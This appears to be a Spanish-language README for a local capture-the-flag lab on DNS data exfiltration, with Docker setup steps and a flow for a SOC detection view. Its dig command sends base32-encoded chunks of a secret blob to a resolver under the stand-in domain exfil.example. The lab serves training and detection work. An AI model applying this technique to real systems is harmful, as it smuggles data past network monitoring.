# Lab dns-exfiltration

Room: **data-exfiltration** (NUEVA, Tier 3). Canal de exfiltración DNS real (UDP).

## Uso
```bash
cp flags.env.example flags.env
docker compose --env-file flags.env up -d
# HTTP :18112 | DNS UDP 127.0.0.1:18153
```

## Flujo
1. `curl http://127.0.0.1:18112/secret` → blob clasificado
2. base32 del blob → trocear en labels ≤40 chars
3. `dig @127.0.0.1 -p 18153 c1-<chunk>.exfil.example` (o /resolve?q= si no hay dig)
4. `/status` → reassembly completo → FLAG_1
5. `/detect` → vista SOC del canal → FLAG_2
